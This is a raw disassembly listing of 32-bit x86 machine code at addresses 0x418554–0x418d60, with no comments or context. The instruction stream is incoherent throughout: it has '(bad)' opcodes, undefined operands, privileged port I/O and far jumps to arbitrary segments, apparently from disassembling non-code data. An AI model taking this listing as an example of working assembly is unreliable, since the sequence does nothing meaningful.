  418554:	sahf   
  418555:	or     esp,DWORD PTR [ebx]
  418557:	sti    
  418558:	push   esp
  418559:	shl    dl,cl
  41855b:	pop    ebx
  41855c:	test   eax,0x9cceabb0
  418561:	jle    0x4184e6
  418563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418564:	add    eax,0xb0962589
  418569:	dec    ecx
  41856a:	fcmovnb st,st(0)
  41856d:	fisubr WORD PTR [edx+0x2a0843ee]
  418573:	push   ecx
  418574:	mov    eax,ds:0x7fc20695
  418579:	sar    DWORD PTR [edi+ecx*4-0x29],cl
  41857d:	test   DWORD PTR [esi+0x39],edx
  418580:	loop   0x4185ee
  418582:	mov    ebp,edx
  418584:	push   eax
  418585:	cld    
  418586:	psrld  mm0,mm3
  418589:	retf   0x867
  41858c:	jae    0x418527
  41858e:	pusha  
  41858f:	clc    
  418590:	lods   eax,DWORD PTR ds:[esi]
  418591:	cwde   
  418592:	xchg   edx,eax
  418593:	push   0x5c
  418595:	div    BYTE PTR [edi+0x5]
  418598:	jge    0x41860a
  41859a:	scas   eax,DWORD PTR es:[edi]
  41859b:	repnz addr16 push es
  41859e:	nop
  41859f:	retf   0xacb9
  4185a2:	call   0xe54535af
  4185a7:	mov    ?,ebp
  4185a9:	ret    
  4185aa:	sbb    eax,0xa7cbb377
  4185af:	fcom   DWORD PTR ds:0x21e3f092
  4185b5:	jnp    0x418621
  4185b7:	fistp  QWORD PTR [eax+0x1b]
  4185ba:	add    eax,0xf8aa3e28
  4185bf:	xchg   ebp,esi
  4185c1:	xchg   ecx,eax
  4185c2:	scas   al,BYTE PTR es:[edi]
  4185c3:	ins    DWORD PTR es:[edi],dx
  4185c4:	out    0x90,al
  4185c6:	jl     0x4185a9
  4185c8:	mov    edx,0xe16044b5
  4185cd:	jmp    0x1806:0xe378ece4
  4185d4:	fs pop ebp
  4185d6:	or     esi,DWORD PTR [edi]
  4185d8:	mov    BYTE PTR [esi+0x1c],bh
  4185db:	or     BYTE PTR [esi+0x2685670],0x2e
  4185e2:	and    BYTE PTR [eax+0x42],dh
  4185e5:	pop    ebx
  4185e6:	pop    ss
  4185e7:	inc    ecx
  4185e8:	ss (bad) 
  4185ea:	std    
  4185eb:	dec    esp
  4185ec:	sbb    bl,BYTE PTR [ebx-0x550740ba]
  4185f2:	ret    0x19fc
  4185f5:	lods   al,BYTE PTR ds:[esi]
  4185f6:	lock xor BYTE PTR [esi+0x3f],bl
  4185fa:	test   edx,0x4edbbaf3
  418600:	sbb    dh,BYTE PTR [eax+0xd]
  418603:	mov    eax,ds:0xbd166368
  418608:	mov    esi,0x1356de6f
  41860d:	das    
  41860e:	jg     0x418669
  418610:	xchg   ebx,eax
  418611:	xchg   edx,eax
  418612:	loop   0x41862e
  418614:	sbb    bl,BYTE PTR [edx+0x755207c6]
  41861a:	outs   dx,DWORD PTR ds:[esi]
  41861b:	mov    DWORD PTR [ebx-0x5],0xf20f937a
  418622:	enter  0x1f50,0xc9
  418626:	fiadd  WORD PTR [ebp+0x5b]
  418629:	mov    edi,0xddd240f8
  41862e:	cmp    ebx,eax
  418630:	and    ah,dh
  418632:	sbb    esi,DWORD PTR [edx+0x58]
  418635:	jbe    0x829b6191
  41863b:	clc    
  41863c:	sub    dl,ah
  41863e:	mov    dh,0x46
  418640:	cld    
  418641:	jnp    0x4185e3
  418643:	std    
  418644:	and    dl,BYTE PTR [edx]
  418646:	add    DWORD PTR [esi+esi*2-0x56],esi
  41864a:	lds    ebx,FWORD PTR [edi]
  41864c:	dec    esp
  41864d:	ret    
  41864e:	jmp    0x56de9d40
  418653:	add    bl,ah
  418655:	dec    edx
  418656:	rcr    DWORD PTR [edi+0x5],cl
  418659:	sub    al,0xca
  41865b:	(bad)  
  41865c:	fimul  WORD PTR [eax-0x2a2748ca]
  418662:	pusha  
  418663:	(bad)  [ebp+0x7bc8660e]
  418669:	mov    dl,0x34
  41866b:	into   
  41866c:	test   al,0x6
  41866e:	sub    BYTE PTR [eax],bh
  418670:	xor    al,0xa1
  418672:	cwde   
  418673:	adc    DWORD PTR [edi+0x48030510],eax
  418679:	daa    
  41867a:	loopne 0x418670
  41867c:	enter  0x82e5,0x7e
  418680:	rcl    DWORD PTR [ecx],1
  418682:	retf   0x34d4
  418685:	mov    eax,ds:0x595f2efb
  41868a:	lock add eax,0x34b5aad5
  418690:	cdq    
  418691:	arpl   WORD PTR [esi-0x63],cx
  418694:	int3   
  418695:	add    BYTE PTR [ecx+0x45798472],ch
  41869b:	sub    esp,DWORD PTR [esp+eax*2-0x22]
  41869f:	fucomi st,st(5)
  4186a1:	retf   
  4186a2:	jle    0x418680
  4186a4:	in     al,dx
  4186a5:	and    edi,esi
  4186a7:	or     DWORD PTR [edx-0x3],edx
  4186aa:	cli    
  4186ab:	sbb    eax,0x9e7ef2bc
  4186b0:	int    0x5d
  4186b2:	out    0x99,al
  4186b4:	adc    ah,bh
  4186b6:	pop    edx
  4186b7:	or     al,0x4a
  4186b9:	sub    DWORD PTR [edx+ebp*8],ebx
  4186bc:	ins    BYTE PTR es:[edi],dx
  4186bd:	loopne 0x418699
  4186bf:	mov    dl,0xf1
  4186c1:	test   DWORD PTR [esi+0x54b74e38],edi
  4186c7:	call   0x76c7:0x1c4b60cd
  4186ce:	in     eax,0x92
  4186d0:	mov    edi,0x3ff3ef70
  4186d5:	hlt    
  4186d6:	lea    esp,[eax+0x209150fc]
  4186dc:	dec    ebx
  4186dd:	scas   al,BYTE PTR es:[edi]
  4186de:	int    0x9a
  4186e0:	shr    DWORD PTR [eax-0x33],cl
  4186e3:	outs   dx,BYTE PTR ds:[esi]
  4186e4:	xchg   esi,eax
  4186e5:	rcl    ebp,1
  4186e7:	in     al,dx
  4186e8:	push   es
  4186e9:	outs   dx,BYTE PTR ds:[esi]
  4186ea:	and    dl,ch
  4186ec:	cli    
  4186ed:	jg     0x41872b
  4186ef:	add    DWORD PTR [ebx+eiz*2],ecx
  4186f2:	ds std 
  4186f4:	dec    eax
  4186f5:	in     eax,0x6e
  4186f7:	xor    ebx,ebp
  4186f9:	lds    ecx,FWORD PTR [ebx-0x5761d90b]
  4186ff:	(bad)  
  418700:	cmp    ch,BYTE PTR [esi]
  418702:	mov    BYTE PTR [ebp+0x3bb36561],ah
  418708:	xchg   esp,eax
  418709:	idiv   DWORD PTR [edi-0x69]
  41870c:	fucomp st(6)
  41870e:	mov    edx,0x11420dab
  418713:	and    eax,0xfd1e6e6b
  418718:	cli    
  418719:	bnd ret 0xfa97
  41871d:	dec    ebp
  41871e:	and    DWORD PTR [ecx-0x9],0x88d4fadb
  418725:	fst    QWORD PTR [esi-0x2a]
  418728:	stos   DWORD PTR es:[edi],eax
  418729:	xchg   BYTE PTR [ebp+ebx*2-0x68e1b5b2],ah
  418730:	and    eax,0xaa1f5a2b
  418735:	rol    DWORD PTR [edi],cl
  418737:	div    BYTE PTR ss:[ebx-0x21]
  41873b:	daa    
  41873c:	test   dl,dh
  41873e:	xchg   edi,eax
  41873f:	mov    esi,0xf4f9b405
  418744:	cwde   
  418745:	xchg   DWORD PTR [eax+0x1],ebp
  418748:	xor    DWORD PTR [eax+0x1bb53f7],esp
  41874e:	imul   ecx,DWORD PTR [esi],0x22
  418751:	popf   
  418752:	mov    ch,0x91
  418754:	out    dx,al
  418755:	mov    gs,WORD PTR [ebx]
  418757:	outs   dx,BYTE PTR ds:[esi]
  418758:	retf   0x3578
  41875b:	pop    esi
  41875c:	mov    edx,0x457bbb36
  418761:	mov    WORD PTR [edx],?
  418763:	es adc al,0x77
  418766:	popa   
  418767:	lock test BYTE PTR [eax],bl
  41876a:	in     al,0x64
  41876c:	lods   eax,DWORD PTR ds:[esi]
  41876d:	inc    esi
  41876e:	mov    DWORD PTR [edi],edi
  418770:	push   0xffffff85
  418772:	xor    ecx,DWORD PTR [edi+0x5fb3353c]
  418778:	pop    esp
  418779:	push   ebp
  41877a:	mov    esi,0x231d6553
  41877f:	ror    ecx,0x70
  418782:	aaa    
  418783:	sbb    dl,ah
  418785:	into   
  418786:	into   
  418787:	lds    eax,FWORD PTR [eax+0x175e7b36]
  41878d:	adc    bl,BYTE PTR [ebp+0x2aced32f]
  418793:	mov    esp,0xdcfb52f8
  418798:	inc    ecx
  418799:	div    bl
  41879b:	xchg   ebp,eax
  41879c:	and    eax,0x3c276fc9
  4187a1:	lods   eax,DWORD PTR ds:[esi]
  4187a2:	push   esi
  4187a3:	je     0x41876c
  4187a5:	das    
  4187a6:	pop    ds
  4187a7:	imul   DWORD PTR [edi+0x68]
  4187aa:	ret    0xb7b3
  4187ad:	into   
  4187ae:	push   ebx
  4187af:	push   ecx
  4187b0:	loop   0x418733
  4187b2:	dec    ebx
  4187b3:	xor    BYTE PTR [eax],cl
  4187b5:	test   al,0x84
  4187b7:	pop    ss
  4187b8:	add    cl,dl
  4187ba:	fs pop eax
  4187bc:	fimul  DWORD PTR [esi]
  4187be:	or     BYTE PTR [eax+0x55ea53d1],dh
  4187c4:	cmp    BYTE PTR ds:0x79fb5fc3,bh
  4187ca:	mov    dl,0x87
  4187cc:	inc    eax
  4187cd:	int    0x66
  4187cf:	rcl    bl,0x58
  4187d2:	je     0x41877a
  4187d4:	inc    esp
  4187d5:	jbe    0x4187f4
  4187d7:	enter  0x5d89,0x73
  4187db:	call   DWORD PTR [esi]
  4187dd:	inc    ebx
  4187de:	dec    ecx
  4187df:	xor    al,0xcf
  4187e1:	mov    esi,0xdbafddc5
  4187e6:	shl    BYTE PTR [esi-0x3f],1
  4187e9:	mov    WORD PTR [edi],?
  4187eb:	inc    esp
  4187ec:	pop    ecx
  4187ed:	loopne 0x41883d
  4187ef:	pop    eax
  4187f0:	adc    al,0x3
  4187f2:	les    edi,FWORD PTR ds:0x6df1a4da
  4187f8:	imul   esp,DWORD PTR [eax],0x29
  4187fb:	pop    edx
  4187fc:	xor    ah,dh
  4187fe:	cmp    ebp,DWORD PTR [ecx]
  418800:	dec    ebp
  418801:	or     BYTE PTR [edx+0x37cb85d],dl
  418807:	xchg   edi,eax
  418808:	jg     0x418790
  41880a:	int    0xb
  41880c:	pop    ebp
  41880d:	adc    eax,0x3b2b706b
  418812:	pop    es
  418813:	mov    bh,bl
  418815:	ins    BYTE PTR es:[edi],dx
  418816:	lds    edi,FWORD PTR [esi]
  418818:	mov    esi,0xa289f600
  41881d:	shl    BYTE PTR [edx-0x61],0xb6
  418821:	test   DWORD PTR [ebp-0x13],ebp
  418824:	shr    DWORD PTR [ecx-0x2f90c93e],0x11
  41882b:	ss push cs
  41882d:	imul   ecx,edx,0xffffffe2
  418830:	imul   ecx,DWORD PTR [esp+ebx*8+0x59a4118c],0x75
  418838:	jg     0x4187cf
  41883a:	xor    eax,0x316831a5
  41883f:	cmc    
  418840:	jmp    0x7033:0x49f0d15d
  418847:	inc    edi
  418848:	cmp    DWORD PTR [ecx-0x43cc7dc5],ebx
  41884e:	repz les esp,FWORD PTR [ebp+0x1c]
  418852:	dec    ecx
  418853:	fstp   QWORD PTR [edi]
  418855:	test   ch,bl
  418857:	xor    DWORD PTR [esi+0x76],esp
  41885a:	bound  esi,QWORD PTR [ecx]
  41885c:	xchg   ebx,eax
  41885d:	jnp    0x4188ae
  41885f:	sti    
  418860:	mov    ebp,0xe2a2fb3d
  418865:	int    0x8b
  418867:	pop    edx
  418868:	fiadd  DWORD PTR [edx]
  41886a:	(bad)
  41886d:	call   0x1754:0xd3d0c52e
  418874:	and    BYTE PTR [edx+edi*8+0x72],ah
  418878:	nop
  418879:	pop    esi
  41887a:	call   0x22292dac
  41887f:	push   esp
  418880:	inc    ebp
  418881:	cmp    eax,0x2f2facf
  418886:	out    0x82,eax
  418888:	daa    
  418889:	or     eax,0x1f1e89a0
  41888e:	cmp    BYTE PTR [esp+edi*8+0x67],bl
  418892:	iret   
  418893:	imul   BYTE PTR [edx]
  418895:	cwde   
  418896:	xchg   esp,eax
  418897:	mov    eax,0x59c7e222
  41889c:	imul   ebp,DWORD PTR [eax-0x3b372f73],0x273090a8
  4188a6:	sub    eax,0x975ef412
  4188ab:	sbb    BYTE PTR [ecx],dh
  4188ad:	pop    edx
  4188ae:	cli    
  4188af:	aad    0xe3
  4188b1:	outs   dx,DWORD PTR ds:[esi]
  4188b2:	retf   0x25ce
  4188b5:	imul   edx,eax,0xf826398
  4188bb:	push   0x1b
  4188bd:	mov    al,0xee
  4188bf:	pop    ebx
  4188c0:	sti    
  4188c1:	fisttp WORD PTR [eax-0x4ce192e0]
  4188c7:	sbb    eax,0xd024418e
  4188cc:	pop    ds
  4188cd:	pop    es
  4188ce:	cmp    al,ah
  4188d0:	or     esi,DWORD PTR cs:[esi+edi*1]
  4188d4:	pusha  
  4188d5:	jne    0x4188a5
  4188d7:	js     0x41885c
  4188d9:	retf   0xe0fc
  4188dc:	cmp    bl,BYTE PTR [ebp+0x41]
  4188df:	ins    DWORD PTR es:[edi],dx
  4188e0:	mov    esp,0x34a5b157
  4188e5:	and    eax,0x87749e13
  4188ea:	cmp    ebx,DWORD PTR [ecx+0x3a]
  4188ed:	cmc    
  4188ee:	test   eax,0xad2c410a
  4188f3:	out    0x26,al
  4188f5:	add    DWORD PTR [edx+0x3cba0a0f],ebp
  4188fb:	cmp    eax,0x3a071205
  418900:	rcl    dh,cl
  418902:	ja     0x4188f0
  418904:	push   ebx
  418905:	lds    ecx,FWORD PTR [ecx+0x35]
  418908:	or     eax,0x6560b808
  41890d:	dec    edx
  41890e:	sti    
  41890f:	cmp    dl,BYTE PTR [ebx]
  418911:	mov    bl,0xde
  418913:	outs   dx,DWORD PTR ds:[esi]
  418914:	ds sahf 
  418916:	outs   dx,BYTE PTR ds:[esi]
  418917:	pop    esi
  418918:	fld    QWORD PTR [edx-0x4c]
  41891b:	add    eax,DWORD PTR [edi-0x2e]
  41891e:	test   eax,0x7b978008
  418923:	mov    al,0xd2
  418925:	cld    
  418926:	out    0x62,al
  418928:	bound  esp,QWORD PTR [ecx+edi*2]
  41892b:	outs   dx,DWORD PTR ds:[esi]
  41892c:	adc    DWORD PTR ds:0x184f71c6,edi
  418932:	cld    
  418933:	xchg   DWORD PTR ds:0xaae0020f,edi
  418939:	jmp    0x418911
  41893b:	sbb    DWORD PTR [esi-0x13],esi
  41893e:	mov    esp,0x9704c5ef
  418943:	mov    DWORD PTR [ebx],esi
  418945:	xor    dl,bl
  418947:	or     ecx,DWORD PTR [ebp+0x3831952b]
  41894d:	jmp    0x475b:0x902e0279
  418954:	es iret 
  418956:	(bad)  
  418957:	push   ecx
  418958:	cs push 0x73
  41895b:	rcr    DWORD PTR fs:[eax+edx*4+0x160582ee],1
  418963:	mov    al,0x16
  418965:	mov    ch,0x95
  418967:	jmp    0x3d511255
  41896c:	or     ecx,DWORD PTR [ecx+0x39]
  41896f:	lahf   
  418970:	mov    ah,0x54
  418972:	pop    esi
  418973:	jle    0x418966
  418975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418976:	xchg   edi,eax
  418977:	sbb    BYTE PTR [edx+0x72],al
  41897a:	out    dx,al
  41897b:	jmp    0xa5c46014
  418980:	cs pop ebx
  418982:	imul   esi,DWORD PTR [edi+0x18845159],0x40
  418989:	test   esi,ebx
  41898b:	add    eax,edi
  41898d:	add    eax,0xba96ccb0
  418992:	iret   
  418993:	dec    ecx
  418994:	test   esp,ecx
  418996:	xor    DWORD PTR [ecx-0x75],esi
  418999:	or     eax,0xcb0701b4
  41899e:	lock dec ecx
  4189a0:	mov    dl,BYTE PTR ds:0xb0e38483
  4189a6:	ds ins DWORD PTR es:[edi],dx
  4189a8:	cmp    eax,DWORD PTR ds:0x76da1b20
  4189ae:	pop    ebx
  4189af:	test   BYTE PTR [ebp+0x15e7bb89],ah
  4189b5:	mov    al,ds:0xf1263075
  4189ba:	xor    BYTE PTR [eax],0x29
  4189bd:	cld    
  4189be:	aad    0x36
  4189c0:	pop    eax
  4189c1:	jmp    0x4189a2
  4189c3:	add    edx,DWORD PTR [eax]
  4189c5:	retf   0xaf92
  4189c8:	jmp    0x418a23
  4189ca:	dec    esp
  4189cb:	push   esi
  4189cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189cd:	and    cl,BYTE PTR [edx-0x4d]
  4189d0:	cli    
  4189d1:	stos   DWORD PTR es:[edi],eax
  4189d2:	jmp    0x418a38
  4189d4:	loopne 0x4189f5
  4189d6:	test   DWORD PTR [edx+edx*2+0x3e0596a5],ebx
  4189dd:	bound  ebp,QWORD PTR [ebp+edx*8+0x3c8f4b12]
  4189e4:	ret    
  4189e5:	xor    al,BYTE PTR ds:[ecx]
  4189e8:	das    
  4189e9:	fs ret 0x3a8
  4189ed:	clc    
  4189ee:	popa   
  4189ef:	jnp    0x4189b8
  4189f1:	imul   edi,esi,0xffffffe1
  4189f4:	bnd jno 0x418a53
  4189f7:	(bad)  
  4189f9:	lock sahf 
  4189fb:	jmp    0x418a43
  4189fd:	test   eax,0x5e60976e
  418a02:	xlat   BYTE PTR ds:[ebx]
  418a03:	hlt    
  418a04:	std    
  418a05:	adc    ecx,0x61
  418a08:	stos   DWORD PTR es:[edi],eax
  418a09:	std    
  418a0a:	rcr    al,0x86
  418a0d:	fldcw  WORD PTR [ebp+ebp*1-0x390b55db]
  418a14:	lea    esi,[eax+0x4af1138c]
  418a1a:	pop    ss
  418a1b:	push   0xfffffff4
  418a1d:	and    DWORD PTR [edx-0x7d],edx
  418a20:	pop    es
  418a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a22:	push   ds
  418a23:	bound  ecx,QWORD PTR [ecx+ecx*1+0x31]
  418a27:	rol    DWORD PTR ds:0x28689c52,0x1e
  418a2e:	adc    DWORD PTR [esi-0x7a79c92d],ebp
  418a34:	mov    eax,0x9f807041
  418a39:	aas    
  418a3a:	add    eax,0x7a542d9a
  418a3f:	sub    DWORD PTR [eax],edi
  418a41:	cmp    DWORD PTR [ecx-0x45ddf713],edi
  418a47:	or     esp,DWORD PTR [edx+0x63fdd2bc]
  418a4d:	sbb    al,0x29
  418a4f:	imul   edx,DWORD PTR [eax],0x3c
  418a52:	mov    ebp,DWORD PTR [ebx]
  418a54:	bound  eax,QWORD PTR [eax+0x4d]
  418a57:	cmc    
  418a58:	call   0xa761:0x8f4fb3dc
  418a5f:	jnp    0x418a89
  418a61:	loope  0x418adf
  418a63:	icebp  
  418a64:	fsubr  DWORD PTR [edi-0x3a6881cf]
  418a6a:	push   ecx
  418a6b:	push   es
  418a6c:	dec    ebp
  418a6d:	sbb    DWORD PTR [esi],0xbfc274ab
  418a73:	ds leave 
  418a75:	arpl   ax,bx
  418a77:	and    al,0x7
  418a79:	adc    DWORD PTR [ecx+esi*2+0x39],esp
  418a7d:	retf   0x689d
  418a80:	push   ebp
  418a81:	xchg   ebx,eax
  418a82:	inc    edx
  418a83:	mov    ecx,0xa4cda22c
  418a88:	les    ebx,FWORD PTR [esi]
  418a8a:	outs   dx,BYTE PTR ds:[esi]
  418a8b:	sub    al,0x77
  418a8d:	xlat   BYTE PTR ds:[ebx]
  418a8e:	push   0xffffff96
  418a90:	test   DWORD PTR [eax],ebp
  418a92:	je     0x418aad
  418a94:	mov    al,0x43
  418a96:	dec    esi
  418a97:	cmp    edx,eax
  418a99:	xlat   BYTE PTR ds:[ebx]
  418a9a:	imul   esp,esp,0x9fd5cb15
  418aa0:	mov    edi,0xc7adce1a
  418aa5:	mov    WORD PTR [edi-0x2ebec88c],?
  418aab:	xchg   ecx,eax
  418aac:	dec    edx
  418aad:	arpl   WORD PTR ds:0x9d549a14,si
  418ab3:	mov    al,ds:0x9e95e770
  418ab8:	rcr    BYTE PTR [eax+0x1d],1
  418abb:	cdq    
  418abc:	dec    ebp
  418abd:	ret    
  418abe:	jnp    0x418ac7
  418ac0:	lds    ebx,FWORD PTR [edx]
  418ac2:	sbb    al,0x18
  418ac4:	sub    esi,ecx
  418ac6:	xchg   esp,eax
  418ac7:	mov    bl,0xf3
  418ac9:	inc    ecx
  418aca:	mov    ah,0xa
  418acc:	push   ebp
  418acd:	pop    edi
  418ace:	pop    ebx
  418acf:	push   ecx
  418ad0:	jo     0x418a65
  418ad2:	sub    DWORD PTR [bx+si],0xb71507f1
  418ad9:	scas   eax,DWORD PTR es:[edi]
  418ada:	inc    DWORD PTR [esi+0x64]
  418add:	push   es
  418ade:	lea    ebp,[eax-0x6c8e04d2]
  418ae4:	mov    edi,0x40b5bdd
  418ae9:	mov    bh,0x71
  418aeb:	adc    eax,0x1a957ae7
  418af0:	ret    0x3a78
  418af3:	dec    esi
  418af4:	jp     0x418a9d
  418af6:	inc    eax
  418af7:	sti    
  418af8:	or     esi,DWORD PTR [ebx-0x5bc38943]
  418afe:	pop    edx
  418aff:	push   cs
  418b00:	daa    
  418b01:	(bad)  
  418b02:	cli    
  418b03:	and    dh,BYTE PTR [edx-0x210b1a6e]
  418b09:	push   es
  418b0a:	data16 std 
  418b0c:	pop    ss
  418b0d:	jecxz  0x418ac2
  418b0f:	call   0xcf40768f
  418b14:	outs   dx,DWORD PTR ds:[esi]
  418b15:	out    dx,eax
  418b16:	jge    0x418a9b
  418b18:	push   esp
  418b19:	cmp    al,0xdf
  418b1c:	daa    
  418b1d:	add    eax,0xbed91fad
  418b22:	push   0x71a0e8ba
  418b27:	and    DWORD PTR [ecx+0x37],ebx
  418b2a:	sbb    dl,BYTE PTR [ebp-0x41]
  418b2d:	outs   dx,DWORD PTR ds:[esi]
  418b2e:	cli    
  418b2f:	sbb    BYTE PTR [ebx-0x4a9f2c85],al
  418b35:	jmp    0xb039:0xe6fda83f
  418b3c:	(bad)  
  418b3d:	mov    al,ds:0xa0471a7b
  418b42:	mov    edx,?
  418b44:	jae    0x418af0
  418b46:	cli    
  418b47:	inc    ecx
  418b48:	pop    esp
  418b49:	inc    ebx
  418b4a:	ja     0x5a43b775
  418b50:	push   esi
  418b51:	ror    dl,cl
  418b53:	jmp    0x8f1f:0xf5a5f516
  418b5a:	hlt    
  418b5b:	sbb    BYTE PTR [ecx+0x9],dl
  418b5e:	push   esp
  418b60:	cmp    esi,DWORD PTR [eax+0x2a]
  418b63:	rol    DWORD PTR [edi-0x7c49a32f],0x2d
  418b6a:	xchg   BYTE PTR [ebx],dl
  418b6c:	out    dx,eax
  418b6d:	adc    BYTE PTR [ebx+eiz*2-0x7883faa],bl
  418b74:	(bad)  
  418b75:	ror    cl,cl
  418b77:	and    ecx,DWORD PTR [edx+0x4d]
  418b7a:	js     0x418b89
  418b7c:	jmp    0x6865ebad
  418b81:	shl    BYTE PTR [ecx+0x317c27d5],1
  418b87:	pusha  
  418b88:	cmp    esi,DWORD PTR [ebx+0x4]
  418b8b:	adc    DWORD PTR [eax],edi
  418b8d:	cs iret 
  418b8f:	sub    DWORD PTR [edi],edi
  418b91:	shr    BYTE PTR [ebx+0xa],1
  418b94:	add    DWORD PTR [eax-0x73],esi
  418b97:	(bad)  
  418b98:	loopne 0x418bdc
  418b9a:	fnstenv [ecx+0x19311d52]
  418ba0:	popf   
  418ba1:	mov    ch,BYTE PTR [eax+edi*1+0x45]
  418ba5:	push   eax
  418ba6:	jnp    0x418b46
  418ba8:	lea    esp,[esi+0x4e]
  418bab:	or     al,0xfa
  418bad:	add    eax,0x842678a0
  418bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bb3:	in     eax,dx
  418bb4:	ret    0x6172
  418bb7:	add    bh,BYTE PTR [ecx+0x5f908fe1]
  418bbd:	and    BYTE PTR [edi],0x4
  418bc0:	lahf   
  418bc1:	add    DWORD PTR [eax+0x318dd4b],edx
  418bc7:	add    eax,0xc2d6aa58
  418bcc:	xor    cl,BYTE PTR [ecx-0x62e22ef8]
  418bd2:	xchg   DWORD PTR [ecx-0x7be78c68],ebp
  418bd8:	(bad)  
  418bd9:	(bad)  
  418bda:	scas   al,BYTE PTR es:[edi]
  418bdb:	scas   eax,DWORD PTR es:[edi]
  418bdc:	gs and eax,esi
  418bdf:	daa    
  418be0:	std    
  418be1:	sbb    ebp,DWORD PTR [eax]
  418be3:	out    dx,al
  418be4:	adc    DWORD PTR ss:[eax+0x3c9b45a7],eax
  418beb:	push   esi
  418bec:	sub    al,0x55
  418bee:	sub    edi,DWORD PTR [ecx]
  418bf0:	mov    ebp,0xa84071a9
  418bf5:	cmp    al,0xd4
  418bf7:	aaa    
  418bf8:	imul   esp,DWORD PTR [eax+0x5e95db4c],0x49
  418bff:	leave  
  418c00:	mov    bh,0xee
  418c02:	out    dx,al
  418c03:	jne    0x418c7e
  418c05:	mov    cl,0x97
  418c07:	pushf  
  418c08:	popf   
  418c09:	and    DWORD PTR [esi-0x226f790b],edx
  418c0f:	mov    esp,0x7d0138ec
  418c14:	ret    0x8b39
  418c17:	out    0xc6,eax
  418c19:	inc    esp
  418c1a:	in     eax,dx
  418c1b:	jb     0x418c46
  418c1d:	push   es
  418c1e:	scas   al,BYTE PTR es:[edi]
  418c1f:	out    0x5c,al
  418c21:	ja     0x418bfd
  418c23:	stos   DWORD PTR es:[edi],eax
  418c24:	mov    dh,0xd7
  418c26:	out    0xd6,eax
  418c28:	xor    dl,BYTE PTR [esi+ebp*2-0x47694c24]
  418c2f:	push   esi
  418c30:	out    dx,al
  418c31:	xchg   edx,eax
  418c32:	or     eax,0xd2e58808
  418c37:	pop    ebp
  418c38:	inc    ebx
  418c39:	add    DWORD PTR [ebx+0x36745bf7],0xe763c0e1
  418c43:	xor    al,0x23
  418c45:	es mov ecx,0xcee94eb7
  418c4b:	mov    edi,0x97a25afa
  418c50:	jmp    0x418c48
  418c52:	inc    esi
  418c53:	ss es fwait
  418c56:	gs int 0xb9
  418c59:	shr    BYTE PTR [ebp-0x1a],cl
  418c5c:	int3   
  418c5d:	mov    WORD PTR gs:[edx],cs
  418c60:	mov    ch,0x9e
  418c62:	mov    eax,ds:0xbc8d9821
  418c67:	repnz push ebp
  418c69:	push   edx
  418c6a:	pop    esi
  418c6b:	ss mov edi,0x6fbbf10d
  418c71:	dec    esi
  418c72:	mov    ebx,0x8e39ac8d
  418c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c78:	pop    eax
  418c79:	mov    eax,0xc9640cbe
  418c7e:	(bad)  
  418c7f:	and    bl,BYTE PTR [esi+0x61201ff3]
  418c85:	and    DWORD PTR [edi+0x2],edi
  418c88:	int3   
  418c89:	mov    eax,ds:0x33c7da4b
  418c8e:	sar    BYTE PTR [ebx-0x3b],cl
  418c91:	shl    bl,1
  418c93:	sahf   
  418c94:	push   esi
  418c95:	out    0xe1,eax
  418c97:	push   esp
  418c98:	add    eax,0xb9d5a3ff
  418c9d:	xor    DWORD PTR [edx+0x6a],ecx
  418ca0:	in     al,0x5e
  418ca2:	stc    
  418ca3:	xor    ch,BYTE PTR [eax+ebp*2+0x1a]
  418ca7:	mov    ecx,0x2d55df4e
  418cac:	mov    bh,0x4b
  418cae:	int3   
  418caf:	sub    DWORD PTR [edi],ebx
  418cb1:	add    al,0xb7
  418cb3:	outs   dx,BYTE PTR ds:[esi]
  418cb4:	push   eax
  418cb5:	cmc    
  418cb6:	jne    0x418c56
  418cb8:	adc    DWORD PTR [edi+0x1c],ecx
  418cbb:	pushf  
  418cbc:	daa    
  418cbd:	mov    BYTE PTR [esi+eax*4],ch
  418cc0:	fst    DWORD PTR ds:[edi-0x5470dbd9]
  418cc7:	pusha  
  418cc8:	fild   DWORD PTR [edi-0x35c68b83]
  418cce:	or     edi,DWORD PTR [ecx]
  418cd0:	inc    edx
  418cd1:	mov    ebx,0xd69c3d49
  418cd6:	xlat   BYTE PTR ds:[ebx]
  418cd7:	mov    al,ds:0x40d0fb34
  418cdc:	push   edx
  418cdd:	xchg   ebp,eax
  418cde:	cdq    
  418cdf:	test   al,0xf5
  418ce1:	ja     0x418d47
  418ce3:	mov    ah,0xa7
  418ce5:	xor    al,BYTE PTR [eax]
  418ce7:	jle    0x418cd7
  418ce9:	jle    0x418c7f
  418ceb:	jge    0x418cb3
  418ced:	mov    edi,0xf34bd4ed
  418cf2:	int3   
  418cf3:	sub    bl,BYTE PTR [edx-0x5c]
  418cf6:	jb     0x418c86
  418cf8:	sub    eax,0xb0913de5
  418cfd:	pushf  
  418cfe:	xchg   ebx,eax
  418cff:	and    al,0x0
  418d01:	cwde   
  418d02:	and    DWORD PTR [edx+0x44f2c50a],esp
  418d08:	inc    DWORD PTR [ebp-0x5dd55be3]
  418d0e:	cdq    
  418d0f:	push   0x3af25705
  418d14:	mov    ebx,0x53232194
  418d19:	push   0x995d9105
  418d1e:	cwde   
  418d1f:	out    dx,eax
  418d20:	xchg   edi,eax
  418d21:	add    al,0x8b
  418d23:	push   ecx
  418d24:	int3   
  418d25:	or     edi,esi
  418d27:	pop    edi
  418d28:	mov    ds:0x4ba0fa88,al
  418d2d:	ins    DWORD PTR es:[edi],dx
  418d2e:	icebp  
  418d2f:	int    0xea
  418d31:	pop    esi
  418d32:	mov    ds:0x2c9ef1a3,eax
  418d37:	or     DWORD PTR [esi],esi
  418d39:	inc    esp
  418d3a:	pop    eax
  418d3b:	xchg   edi,eax
  418d3c:	bnd je 0x418d00
  418d3f:	add    ecx,DWORD PTR [ecx-0x62]
  418d42:	cmc    
  418d43:	jae    0x418d84
  418d45:	adc    dh,BYTE PTR [ebx-0x2ca364cc]
  418d4b:	in     eax,0xd1
  418d4d:	aas    
  418d4e:	fnstcw WORD PTR [ebx]
  418d50:	push   ss
  418d51:	shr    DWORD PTR [edx],1
  418d53:	ja     0x418d24
  418d55:	shl    BYTE PTR [ebp-0x7f],cl
  418d58:	mov    eax,0x18e47d98
  418d5d:	inc    ebx
  418d5e:	je     0x418cef
  418d60:	jno    0x418d2c
